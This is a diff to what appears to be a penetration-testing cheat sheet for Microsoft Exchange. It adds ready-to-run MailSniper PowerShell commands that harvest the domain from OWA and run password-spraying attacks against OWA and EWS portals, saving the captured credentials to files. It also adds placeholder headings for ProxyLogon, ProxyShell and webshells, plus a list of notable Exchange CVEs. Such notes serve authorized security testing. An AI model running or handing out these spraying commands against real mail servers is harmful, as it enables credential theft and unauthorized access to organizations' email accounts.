@@ -17,12 +17,43 @@ sudo python3 get_exchange_version.py https://mail.target.com
 ```
 
 
-## CVE-2021-34473
-Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.
+
+## Bruteforce
+
+### use MailSniper enum
+
+```powershell
+Import-Module MailSniper.ps1
+Invoke-DomainHarvestOWA -ExchHostname mail.domain.com
+```
+
+### Password Spray
+* PasswordSprayOWA : will attempt to connect to an OWA portal and perform a password spraying attack using a userlist and a single password.
+* PasswordSprayEWS :  will attempt to connect to an EWS portal and perform a password spraying attack using a userlist and a single password.
+
+```powershell
+Import-Module MailSniper.ps1
+Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
+Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
+```
 
 
 
 
+## GAL 
+
+## ProxyLogon
+
+
+## ProxyShell
+
+
+## WebShell
+
+
+
+#### most famous cve
+```
 cve-2021-31206
 cve-2021-31207
 cve-2021-34473
@@ -32,4 +63,5 @@ cve-2021-26857
 cve-2021-26858
 cve-2021-27065
 cve-2015-1635
+```
 
